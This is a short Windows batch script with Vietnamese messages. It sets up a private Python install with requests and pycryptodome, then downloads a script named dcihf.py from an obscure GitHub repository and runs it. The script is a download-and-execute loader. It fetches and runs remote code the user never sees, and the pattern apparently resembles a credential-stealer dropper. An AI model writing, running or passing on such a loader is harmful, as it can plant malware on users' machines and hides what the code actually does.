@echo off
setlocal
set "env_dir=%~dp0env"
python --version >nul 2>&1
if %errorlevel% equ 0 (
    echo Đã phát hiện Python đã cài đặt trên máy tính. Đang gỡ cài đặt phiên bản hiện tại...
    start /wait cmd /c "python -m pip uninstall -y python && python -m pip uninstall -y pycryptodome && python -m pip uninstall -y requests"
)
mkdir "%env_dir%" 2>nul
cd "%env_dir%"
if not exist "%env_dir%\python.exe" (
    echo Python chưa được cài đặt trong thư mục env. Đang tải Python...
    powershell -Command "Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -OutFile python-3.10.0-amd64.exe"
    start /wait python-3.10.0-amd64.exe /quiet InstallAllUsers=0 TargetDir="%env_dir%" PrependPath=0
    python -m ensurepip
    python -m pip install --upgrade pip
    python -m pip install requests pycryptodome
    del python-3.10.0-amd64.exe
)

echo Đang tải file Python...
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/tranminhquang2347/adscsacsactest34/main/dcihf.py -OutFile dcihf.py"
echo Đang chạy script Python...
start dcihf.py
pause >nul

endlocal
